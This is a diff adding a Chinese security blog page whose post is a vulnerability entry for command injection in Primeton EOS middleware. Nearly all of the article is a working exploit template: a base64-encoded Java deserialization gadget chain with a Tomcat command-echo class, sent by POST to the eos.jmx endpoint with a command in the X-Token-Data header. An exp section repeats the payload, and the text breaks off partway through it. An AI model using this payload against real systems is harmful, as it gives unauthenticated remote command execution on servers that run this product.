@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>普元EOS中间件存在命令注入漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="普元EOS中间件存在命令注入漏洞" />
+<meta property="og:description" content="``` detail: ID: 4877 Author: 玄道 Name: 普元EOS中间件存在命令注入漏洞 Description: Primeton EOS是上海普元信息技术有限责任公司自主研发的面向构件的中间件，是基于J2EE之上的面向" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="普元EOS中间件存在命令注入漏洞"/>
+<meta name="twitter:description" content="``` detail: ID: 4877 Author: 玄道 Name: 普元EOS中间件存在命令注入漏洞 Description: Primeton EOS是上海普元信息技术有限责任公司自主研发的面向构件的中间件，是基于J2EE之上的面向"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "普元EOS中间件存在命令注入漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "2023hw","wordcount":  406 ,
+        "url": "http:\/\/example.org\/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">普元EOS中间件存在命令注入漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;406 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><pre><code>```
+</code></pre>
+<p>detail:
+ID: 4877
+Author: 玄道
+Name: 普元EOS中间件存在命令注入漏洞
+Description: Primeton EOS是上海普元信息技术有限责任公司自主研发的面向构件的中间件，是基于J2EE之上的面向构件的完整的互联网应用体系。
+Primeton EOS产品提供了对构件在定义、组装、发布、运行、管理、访问等多方面的全方位支持和完善服务，形成了一套完整的构件体系。普元EOS中间件存在命令注入漏洞，攻击者可执行命令。
+Identifier:
+DVB: DVB-2023-4877
+VulnClass:</p>
+<ul>
+<li>远程命令执行
+Category:</li>
+<li>Web服务器集群
+Manufacturer: 普元EOS
+Product: 普元EOS
+Type: 1
+Status: 1
+Scanable: 1
+Level: 4
+DisclosureDate: &lsquo;2023-08-09&rsquo;
+VulnImpact: 严重
+Region: 中国大陆
+Is0day: false
+IncludeExp: true
+Weakable: false
+IsXc: false
+IsCommon: false
+IsCallBack: false
+Condition: body=&ldquo;普元&rdquo;||(body=&ldquo;ame.primeton.com&rdquo;&amp;&amp;body=&ldquo;eos-web&rdquo;)
+Solutions:</li>
+<li>请关注厂商的修复版本，并及时更新到最新版本.
+poc:
+relative: req0
+session: false
+get_variables:</li>
+<li>baseDATA: base64Decode(&ldquo;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAAB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/PK/rq+AAAAMQDjAQAub3JnL2FwYWNoZS9jb3lvdGUvdGFnbGliL2NvcmUvQ29udmVydGVySW1wbFRhZwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlDAAFAAYKAAQACQEAAXEBADMoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdleGVjQ21kDAANAAwKAAIADgEACDxjbGluaXQ+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwARAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAEwEAE2phdmEvbGFuZy9FeGNlcHRpb24HABUBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHABcBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHABkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAGwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAB0BABBqYXZhL2xhbmcvVGhyZWFkBwAfAQAQamF2YS9sYW5nL1N0cmluZwcAIQEADmphdmEvdXRpbC9MaXN0BwAjAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HACUBAA1TdGFja01hcFRhYmxlAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAoACkKACAAKgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwALAAtCgAgAC4BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DAAwADEKACAAMgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwANAA1CgAEADYBAAd0aHJlYWRzCAA4AQAPamF2YS9sYW5nL0NsYXNzBwA6AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAPAA9CgA7AD4BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAQABBCgAcAEIBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwARABFCgAcAEYBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAEgASQoAIABKAQAEZXhlYwgATAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABOAE8KACIAUAEABGh0dHAIAFIBAAZ0YXJnZXQIAFQBABJqYXZhL2xhbmcvUnVubmFibGUHAFYBAAZ0aGlzJDAIAFgBAAdoYW5kbGVyCABaAQANZ2V0U3VwZXJjbGFzcwwAXAA1CgA7AF0BAAZnbG9iYWwIAF8BAApwcm9jZXNzb3JzCABhAQAEc2l6ZQEAAygpSQwAYwBkCwAkAGUBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEQAZwsAJABoAQADcmVxCABqAQALZ2V0UmVzcG9uc2UIAGwBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABuAG8KADsAcAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAcgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdAB1CgBzAHYBAAlnZXRIZWFkZXIIAHgBAApDTURfSEVBREVSAQASTGphdmEvbGFuZy9TdHJpbmc7DAB6AHsJAAIAfAEAB2lzRW1wdHkBAAMoKVoMAH4AfwoAIgCAAQAJc2V0U3RhdHVzCACCAQARamF2YS9sYW5nL0ludGVnZXIHAIQBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAIYAhwkAhQCIAQAEKEkpVgwABQCKCgCFAIsMAAsADAoAAgCNAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACPAQAHZm9yTmFtZQEAPShMamF2YS9sYW5nL1N0cmluZztaTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsMAJEAkgoAOwCTAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAlQCWCgA7AJcBAAhzZXRCeXRlcwgAmQEAAltCBwCbAQARZ2V0RGVjbGFyZWRNZXRob2QMAJ0AbwoAOwCeAQALdG9CeXRlQXJyYXkBAAQoKVtCDACgAKEKACYAogEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DACkAKUKAIUApgEAB2RvV3JpdGUIAKgBABNqYXZhLm5pby5CeXRlQnVmZmVyCACqAQAEd3JhcAgArAEA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&rdquo;)
+requests:</li>
+<li>method: POST
+timeout: 10
+path: /workspace/frame/permission/common/eos.jmx
+headers:
+Content-Type: text/plain
+X-Token-Data: id
+data: &lsquo;{{baseDATA}}&rsquo;
+follow_redirects: true
+matches: (code.eq(&ldquo;200&rdquo;) &amp;&amp; body.contains(&ldquo;uid=&rdquo;))
+exp:
+relative: req0
+session: false
+get_variables:</li>
+<li>baseDATA: base64Decode(&ldquo;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAAB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/PK/rq+AAAAMQDjAQAub3JnL2FwYWNoZS9jb3lvdGUvdGFnbGliL2NvcmUvQ29udmVydGVySW1wbFRhZwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlDAAFAAYKAAQACQEAAXEBADMoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdleGVjQ21kDAANAAwKAAIADgEACDxjbGluaXQ+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwARAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAEwEAE2phdmEvbGFuZy9FeGNlcHRpb24HABUBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHABcBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHABkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAGwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAB0BABBqYXZhL2xhbmcvVGhyZWFkBwAfAQAQamF2YS9sYW5nL1N0cmluZwcAIQEADmphdmEvdXRpbC9MaXN0BwAjAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HACUBAA1TdGFja01hcFRhYmxlAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAoACkKACAAKgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwALAAtCgAgAC4BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DAAwADEKACAAMgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwANAA1CgAEADYBAAd0aHJlYWRzCAA4AQAPamF2YS9sYW5nL0NsYXNzBwA6AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAPAA9CgA7AD4BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAQABBCgAcAEIBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwARABFCgAcAEYBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAEgASQoAIABKAQAEZXhlYwgATAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABOAE8KACIAUAEABGh0dHAIAFIBAAZ0YXJnZXQIAFQBABJqYXZhL2xhbmcvUnVubmFibGUHAFYBAAZ0aGlzJDAIAFgBAAdoYW5kbGVyCABaAQANZ2V0U3VwZXJjbGFzcwwAXAA1CgA7AF0BAAZnbG9iYWwIAF8BAApwcm9jZXNzb3JzCABhAQAEc2l6ZQEAAygpSQwAYwBkCwAkAGUBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEQAZwsAJABoAQADcmVxCABqAQALZ2V0UmVzcG9uc2UIAGwBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABuAG8KADsAcAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAcgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdAB1CgBzAHYBAAlnZXRIZWFkZXIIAHgBAApDTURfSEVBREVSAQASTGphdmEvbGFuZy9TdHJpbmc7DAB6AHsJAAIAfAEAB2lzRW1wdHkBAAMoKVoMAH4AfwoAIgCAAQAJc2V0U3RhdHVzCACCAQARamF2YS9sYW5nL0ludGVnZXIHAIQBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAIYAhwkAhQCIAQAEKEkpVgwABQCKCgCFAIsMAAsADAoAAgCNAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACPAQAHZm9yTmFtZQEAPShMamF2YS9sYW5nL1N0cmluZztaTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsMAJEAkgoAOwCTAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAlQCWCgA7AJcBAAhzZXRCeXRlcwgAmQEAAltCBwCbAQARZ2V0RGVjbGFyZWRNZXRob2QMAJ0AbwoAOwCeAQALdG9CeXRlQXJyYXkBAAQoKVtCDACgAKEKACYAogEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DACkAKUKAIUApgEAB